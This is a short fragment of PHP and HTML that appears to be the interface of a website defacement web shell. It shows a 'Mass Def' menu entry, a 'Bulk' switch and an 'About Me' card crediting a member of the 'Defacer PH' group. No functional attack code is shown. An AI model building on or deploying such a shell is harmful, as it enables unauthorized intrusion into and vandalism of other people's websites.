...
<div class='dropdown'>
	...
	<div class='dropdown-menu'>
		...
		<a class='dropdown-item' href='?path=$path&dir=$path&id=depes'><i class='bi bi-exclamation-diamond'></i> Mass Def</a>
...
<div class='custom-control custom-switch'>
	<input type='checkbox' id='customSwitch1' class='custom-control-input' name='tipe' value='Bulk'>
...
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<img alt='Mrj Haxcore' class='img-thumbnail rounded mx-auto d-block' src='https://ajcoderblog.files.wordpress.com/2016/07/gffn08tb4ccfzhzgw6wvshwwqo6lmluq.gif?w=244' width='150px'>";
echo "<b>- About Me -</b><br />";
echo "Mrj Haxcore is a pioneer in cyber space and also a member of Defacer PH<br />Greetz : <a href=''>{ Defacer PH } - And You</a><br />My email: <a href='mailto:secret@gmail.com'>secret@gmail.com</a>";
	echo '</div>
	</div>
</div>';
}
